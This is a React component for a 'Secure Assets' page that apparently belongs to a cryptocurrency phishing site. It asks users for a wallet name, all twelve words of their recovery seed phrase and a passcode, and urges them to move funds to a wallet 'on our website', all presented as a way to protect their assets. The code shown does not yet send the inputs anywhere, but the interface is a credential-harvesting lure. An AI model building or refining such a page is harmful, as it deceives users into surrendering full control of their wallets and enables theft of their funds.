import React, { useState } from "react";
import "../styles/Secure.css";
import Modal from "react-modal";
import { IoClose } from "react-icons/io5";

const Secure = () => {
  const [phrases, setPhrases] = useState(Array(12).fill(""));
  const [wallet, setWallet] = useState("");
  const [modalMessage, setModalMessage] = useState("");
  const [passcode, setPasscode] = useState(Array(4).fill(""));
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handlePhraseChange = (index, value) => {
    const newPhrases = [...phrases];
    newPhrases[index] = value;
    setPhrases(newPhrases);
  };

  const handleWalletChange = (e) => {
    setWallet(e.target.value);
  };

  const handlePasscodeChange = (index, value) => {
    const newPasscode = [...passcode];
    newPasscode[index] = value;
    setPasscode(newPasscode);
  };

  const handleSecureClick = () => {
    if (phrases.every((phrase) => phrase.trim() !== "")) {
      setModalMessage("Enter your code to secure your assets");
      setIsModalOpen(true);
    } else {
      setModalMessage("Please enter a valid 12-phrase security code.");
      setIsModalOpen(true);
    }
  };

  // const handlePasswordSubmit = () => {
  //   if (passcode.trim() !== "") {
  //     setModalMessage(
  //       "Your assets are now secured with your 12-phrase security code."
  //     );
  //     setIsPasswordModalOpen(false);
  //     setIsModalOpen(true);
  //   } else {
  //     setModalMessage("Enter your code to secure your assets");
  //     setIsModalOpen(true);
  //   }
  // };

  const closeModal = () => {
    setIsModalOpen(false);
    setPasscode(Array(4).fill(""));
  };

  return (
    <div className="secureDiv1">
      <div className="transactDiv2">
        <h2>SECURE ASSETS</h2>
      </div>
      <div style={{ marginTop: 20 }}>
        <h3>You can secure your assets in your wallet by:</h3>
        <ul style={{ color: "white" }}>
          <li>
            <h3>Inputting your 12-phrase security code below.</h3>
          </li>
          <li>
            <h3>
              Transferring your assets to your assets wallet on our website.
            </h3>
          </li>
        </ul>
      </div>
      <div style={{ marginTop: 50 }}>
        <h3>Wallet Name</h3>
        <div className="withdrawDiv2">
          <input
            type="text"
            value={wallet}
            onChange={handleWalletChange}
            placeholder="Enter wallet name"
          />
        </div>
      </div>

      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(2, 1fr)",
          gap: "10px",
          marginTop: 30,
        }}
      >
        {phrases.map((phrase, index) => (
          <input
            key={index}
            type="text"
            value={phrase}
            onChange={(e) => handlePhraseChange(index, e.target.value)}
            placeholder={`Phrase ${index + 1}`}
          />
        ))}
      </div>
      <div className="depositDiv9">
        <button onClick={handleSecureClick}>Secure Assets</button>
      </div>

      <Modal
        isOpen={isModalOpen}
        onRequestClose={closeModal}
        className="modalContent"
        overlayClassName="modalOverlay"
      >
        <div className="modalContent">
          <IoClose className="iq" onClick={closeModal} />
          <h2>{modalMessage}</h2>
          {modalMessage !== "Please enter a valid 12-phrase security code." && (
            <>
              <div className="passcodeInput">
                {passcode.map((digit, index) => (
                  <input
                    key={index}
                    type="text"
                    maxLength="1"
                    value={digit}
                    onChange={(e) =>
                      handlePasscodeChange(index, e.target.value)
                    }
                  />
                ))}
              </div>
              <div className="depositDiv9">
                <button>Confirm</button>
              </div>
            </>
          )}
        </div>
      </Modal>
    </div>
  );
};

export default Secure;
